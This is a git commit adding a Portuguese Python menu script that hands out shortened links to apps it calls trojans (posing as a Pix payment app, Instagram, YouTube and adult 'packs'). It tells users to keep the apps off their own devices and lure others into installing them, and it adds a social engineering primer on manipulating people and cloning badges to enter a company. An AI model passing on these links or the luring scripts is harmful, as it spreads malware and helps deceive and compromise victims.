626f589543b9a5fbbc88d123ad26df995a624d3f
Devi <116770357+Devitravazx@users.noreply.github.com>
2022-10-26 22:00:20 -0400

    Create main.py

---
+++ .github/main.py
@@ -0,0 +1,211 @@
+import colorama 
+from colorama import Fore, Style 
+
+
+print('''
+
+\033[32m
+                         
+               _______   _______ ____    ____  __  
+               |       \ |   ____|\   \  /   / |  | 
+               |  .--.  ||  |__    \   \/   /  |  | 
+               |  |  |  ||   __|    \      /   |  | 
+               |  '--'  ||  |____    \    /    |  | 
+               |_______/ |_______|    \__/     |__| 
+                                                  
+
+                                                                
+                                
+
+▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
+▒▒█▒▒▒▄██████████▄▒▒▒▒
+▒█▐▒▒▒████████████▒▒▒▒
+▒▌▐▒▒██▄▀██████▀▄██▒▒▒
+▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
+▐┼▐▒▒██████████████▒▒▒
+▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
+▒▒█████──────────▐███▌
+▒▒█▀▀██▄█─▄───▐─▄███▀▒
+▒▒█▒▒███████▄██████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒█████████▐▌██▌▒▒▒
+▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
+
+0:Como usar\033[31m(importante)\033[0;0m
+\033[32m1:MeusPacks(trojan)
+2:pix-seguro(trojan)
+3:instagramPro(trojan)
+4:Surpresa
+5:YoutubePro(trojan)
+6:Engenharia social(tecnica de enganar)
+7:Creditos
+(para sair ctrl+c [enter])
+\033[0;0m
+''')
+print('''
+	
+\033[31m AVISO NAO NOS RESPONSABILIZAMOS POR
+ATOS MALICIOSOS COM O USO DO PROGRAMA!!!
+
+tudo que esta acima nominado de trojan
+NAO ABAIXE NO SEU DISPOSITIVO APENAS USE EM DOWNLOADS
+\033[0;0m
+''')
+
+while True:
+        
+    
+    opcao = input(Fore.GREEN + Style.BRIGHT + 'Digite um numero:  ' + Fore.RESET)
+    
+
+    if opcao == '1':
+        print('''
+\033[31m
+===========================
+	
+NAO INSTALE NO DIPOSITIVO!!
+	
+https://bityli.com/HFlSJiky
+===========================
+\033[0;0m
+''')
+     
+    elif opcao == '2':
+         print('''
+\033[31m
+===========================
+	
+NAO INSTALE NO DISPOSITIVO!!
+	
+https://bit.ly/3E9h5lZ
+===========================
+\033[0;0m''')
+
+    elif opcao == '3':
+         print('''
+\033[31m
+===========================
+	
+NAO INSTALE NO DISPOSITIVO!!
+	
+https://bit.ly/3RtOtqg
+===========================
+\033[0;0m''')
+
+    elif opcao == '4':
+         print('''
+
+===========================
+\033[35m
+  .-"""-.    .-"""-.
+ /       `..'       \Para
+|                    |voces
+|                    |by
+ \                  /devi
+  \                /
+   `\            /'
+     `\        /'
+       `\    /'
+         `\/'
+\033[0;0m
+===========================
+''')
+
+                             
+    elif opcao == '5':
+         print('''
+\033[31m
+===========================
+	
+NAO INSTALE NO DISPOSITIVO!!
+	
+https://bit.ly/3fBLaQV
+===========================
+\033[0;0m''')
+
+    elif opcao == '6':
+         print('''
+\033[31m
+================================================
+Engenharia social - A arte de enganar as pessoas
+================================================
+engenharia social a arte de enganar e hackear pessoas
+basicamente manipular uma mente humana e tirar esse
+proveito da falha pois nenhum sistema e 100% seguro
+nem mesmo os maiores como facebook instagram cada entre
+2 a 3 anos sao achadas falhas tais como criticas
+entao bora para o assunto
+basicamente vc vai usar sua inteligencia para manipular
+uma mente como aquela famosa tecnica do support Whatsapp 
+exemplo vc pode usar essa tecnica para tirar algo de alguem
+principal como conhecer esse alvo exemplo seu colega de sala
+vc nao fala muito com ele mais deve conhecer seus pontos forte
+como humildade inteligencia egoismo e etc.. ele ta com
+uma bolacha ali e como vc chegaria nele? se ele for
+fragil pelo lado de sentimento vc com uns papo exemplo
+sentar ali conversar puxar assunto ate que ele decida dar a bolacha
+mas quando for nao demonstre interesse na bolacha senao ele percebera
+ou seja quando estiver fazendo essa acao em um alvo e necessario
+que nao demonstre muito interesse ou deixe seus sentimentos agirem
+pode acabar atrapalhando isso aqui foi um pequeno resumo sobre a 
+arte de enganar pessoas posso citar outro exemplo caso esse seja fragil
+ok vamos la
+suponhamos que vc e um pentest e foi contratado pelo chefe de uma empresa
+para testar a seguranca dela (vou passar pra avisar um detalhe importante 
+nem toda seguranca e no site e sim fisicamente)
+entao hoje e seu primeiro dia la na empresa lara testa-la
+vc consegue informacoes sobre o cracha dod funcionarios cartao e chega em alguem
+puxa um papo tenta conseguir informacoes privilegias mais nao seja muito direto
+pois ira desconfiar se souber a tecnica de pegar algo de alguem
+conhecida como pickpocket eu axo pode usa r no cracha da pessoa
+ai certo voce conseguiu informacoes do cracha e conseguiu clonar um 
+vc vai na empresa passa como um funcionario puxa procura uma maquina
+para comecar seu ataque da maquina do funcionario 
+assim facilita a invasao da impresa informacoes privilegias e assim fazer isso 
+todos os dias possiveis coletar o maximo de informacoes
+e com decorrer do tempo vc consegue mais e mais dai vamos supor
+que vc conseguiu o login admin da empresa e efetuou um ataque leve apenas para
+provar que a seguranca ali nao e boa depois vc fala isso com o chefe conta como conseguiu acesso
+que vc sera pago da forma certa do jeito que vcs fizeram um acordo
+ou seja nao e somente o site que e seguro os funcionarios tbm devem serem
+
+\033[0;0m''')
+
+    elif opcao == '7':
+    	print('''
+ \033[32m
+    	OO═══∩═══OO
+...........╭╬╮ ◢ by:Jhaay
+-✶-╭▅▇□□█▇▆▅▄▃▂▁(╳)█╮
+.....╰═▃_▁∠════▔▔▔
+............╙O ╙O\033[0;0m \033[35m-Meu numero:https:/wa.me/+556781279282
+\033[0;0m
+''')
+
+    elif opcao == '0':
+        print('''
+\033[32m
+======================
+Como usar a ferramenta
+======================
+
+
+(leia)Vc sera redirecionado para o mediafire vc aperta faz download e deixa na pasta q vai automaticamente \033[31mNAO ABAIXE NO DISPOSITIVO APERTANDO PARA INSTALAR\033[0;0m
+
+\033[32m
+1- Apos ter feito o download deixe pa na pasta
+2-de acordo com o apk vc vai agir 
+exemplo: Vc baixou o meuspacks (nao instale no celular)
+vc pode tirar proveito desse nome em grupos fe pornografia infantil eles vao ver mas pra isso vc tera que convenser eles como
+
+Ola, sou taltal, como vai? esta cansado de ver packs pagos? entao veja no meu aplicativo fe packs para ver packs de graca!! basta so baixar o app e aproveitar
+
+assim vc podera conseguir derrubar esse marginal
+
+para mais aprendizagem de uso dos trojans digite 6
+\033[0;0m
+''')
+
+    else:
+         print("Codigo recebido invalido!")
